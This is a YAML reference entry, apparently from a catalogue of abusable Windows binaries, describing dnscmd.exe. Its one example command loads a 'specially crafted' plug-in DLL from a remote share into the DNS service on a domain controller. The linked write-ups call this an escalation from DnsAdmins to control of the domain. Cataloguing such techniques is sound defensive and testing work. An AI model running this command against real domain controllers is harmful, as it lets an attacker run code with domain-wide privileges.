---
name: dnscmd.exe
description: A command-line interface for managing DNS servers. This utility is useful in scripting batch files to help automate routine DNS management tasks, or to perform simple unattended setup and configuration of new DNS servers on your network.
functions:
  execute:
    - description: Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details.
      code: dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\wtf.dll
resources: 
    - resource: https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
    - resource: https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html
    - resource: https://github.com/dim0x69/dns-exe-persistance/tree/master/dns-plugindll-vcpp
    - resource: https://twitter.com/Hexacorn/status/994000792628719618
    - resource: http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html
    - resource: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd
fullpath: 
    - path: c:\windows\system32\Dnscmd.exe
    - path: c:\windows\sysWOW64\Dnscmd.exe
notes: Thanks to Shay Ber - ?, Dimitrios Slamaris - @dim0x69, Nikhil SamratAshok Mittal - @nikhil_mitt
---